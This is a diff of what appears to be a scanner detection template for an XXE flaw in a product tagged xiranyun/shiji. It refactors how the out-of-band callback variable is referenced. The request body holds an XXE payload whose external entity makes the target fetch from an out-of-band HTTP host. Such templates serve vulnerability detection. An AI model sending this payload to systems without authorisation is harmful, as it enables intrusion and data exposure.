@@ -10,9 +10,6 @@ info:
   tags: xiranyun,xxe,shiji
   created: 2025/07/03
 
-set:
-  oob: oob()
-  oobHTTP: oob.HTTP
 rules:
   r0:
     request:
@@ -21,6 +18,6 @@ rules:
       headers:
         Content-Type: text/xml
       body: |
-        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "{{oobHTTP}}"> %remote;]>
-    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "{{oob.HTTP}}"> %remote;]>
+    expression: oobCheck(oob.ProtocolHTTP, 3)
 expression: r0()
